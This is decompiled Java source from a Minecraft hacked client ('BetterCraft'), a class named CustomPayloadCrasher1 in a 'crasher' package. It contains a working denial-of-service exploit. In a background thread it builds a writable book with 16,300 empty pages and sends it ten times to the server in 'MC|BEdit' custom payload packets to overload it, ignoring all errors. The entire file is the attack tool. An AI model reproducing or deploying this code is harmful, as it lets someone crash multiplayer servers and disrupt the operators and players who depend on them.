/*    */ package me.nzxter.bettercraft.mods.crasher.cpc;
/*    */ import io.netty.buffer.Unpooled;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.PacketBuffer;
/*    */ import net.minecraft.network.play.client.CPacketCustomPayload;
/*    */ 
/*    */ public class CustomPayloadCrasher1 {
/*    */   public static void start() {
/* 15 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/*    */           try {
/* 20 */             NBTTagList bookPages = new NBTTagList();
/* 21 */             for (int i2 = 0; i2 < 16300; i2++) {
/* 22 */               bookPages.appendTag((NBTBase)new NBTTagString(""));
/*    */             }
/* 24 */             for (int i3 = 0; i3 < 10; i3++) {
/* 25 */               ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
/* 26 */               book.setTagInfo("pages", (NBTBase)bookPages);
/* 27 */               PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
/* 28 */               pb.writeItemStackToBuffer(book);
/* 29 */               (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BEdit", pb));
/*    */             }
/*    */           
/* 32 */           } catch (Exception exception) {}
/*    */         }
/* 36 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\cpc\CustomPayloadCrasher1.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */